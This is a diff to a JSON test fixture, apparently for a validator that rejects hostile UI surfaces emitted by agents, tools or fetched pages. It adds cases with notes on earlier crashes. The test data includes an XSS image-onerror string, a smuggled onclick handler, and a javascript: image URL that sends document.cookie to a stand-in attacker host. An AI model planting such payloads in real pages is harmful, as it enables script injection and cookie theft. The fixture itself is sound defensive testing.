@@ -1,5 +1,5 @@
 {
-  "description": "Four surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
+  "description": "Eleven surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders. Every case that can carry a scaffold uses the same one — a root Column over [ok, evil] — so `accepted` staying exactly [root, ok] is the observable proof that one poisoned node does not blank the screen. The last four cases were added after three of them were found to return HTTP 500 rather than a rejection: an endpoint whose stated contract is 'hand me anything, including hostile' was falling over on one-line bodies.",
   "cases": [
     {
       "name": "raw-html-type",
@@ -13,7 +13,8 @@
         ],
         "dataModel": {"title": "Dashboard"}
       },
-      "expect_invariant": "catalog"
+      "expect_invariant": "catalog",
+      "expect_accepted": ["root", "ok"]
     },
     {
       "name": "smuggled-handler",
@@ -27,7 +28,8 @@
         ],
         "dataModel": {"title": "Dashboard"}
       },
-      "expect_invariant": "data-not-code"
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
     },
     {
       "name": "markup-in-binding",
@@ -41,7 +43,8 @@
         ],
         "dataModel": {"title": "Dashboard"}
       },
-      "expect_invariant": "data-not-code"
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
     },
     {
       "name": "unregistered-action",
@@ -55,7 +58,105 @@
         ],
         "dataModel": {"title": "Dashboard"}
       },
-      "expect_invariant": "event"
+      "expect_invariant": "event",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "nonstring-pointer",
+      "note": "A binding whose $bind is a number. Previously HTTP 500: the shape check only asked whether the key existed, so a regex then matched an int and raised TypeError. A crash is not a refusal.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Text", "text": {"$bind": 5}}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "binding-extra-keys",
+      "note": "A well-formed pointer carrying a passenger. The old check was 'is a dict and has $bind', which let every other key ride through the wall untouched.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Text", "text": {"$bind": "/title", "onclick": "steal()"}}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "component-not-an-object",
+      "note": "An integer where a component belongs. Previously HTTP 500 on .get().",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          7
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "catalog",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "components-not-a-list",
+      "note": "components as a bare string. Previously HTTP 500 — and worse, a string is iterable, so the loop would have walked it one character at a time.",
+      "surface": {"root": "root", "components": "evil", "dataModel": {}},
+      "expect_invariant": "catalog",
+      "expect_accepted": []
+    },
+    {
+      "name": "structure-in-text-prop",
+      "note": "A dict on a text prop that is NOT declared bindable. The markup check is isinstance(str)-guarded, so a structure walks straight past it and reaches the client as an object it was never told to expect.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Image", "src": "/logo.png", "alt": {"$bind": "/title"}}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "markup-in-number-prop",
+      "note": "Markup on a number prop. The markup check used to run only for text and binding kinds, so this was accepted: the kind describes what a property MEANS, not what a hostile agent will put in it.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Slider", "label": "Weight", "value": {"$bind": "/w"}, "min": 0, "max": "<img src=x onerror=alert(1)>"}
+        ],
+        "dataModel": {"title": "Dashboard", "w": 5}
+      },
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
+    },
+    {
+      "name": "js-url-in-image-src",
+      "note": "A javascript: scheme where an image path belongs.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Image", "src": "javascript:fetch('https://attacker.example/'+document.cookie)", "alt": "chart"}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code",
+      "expect_accepted": ["root", "ok"]
     }
   ]
 }
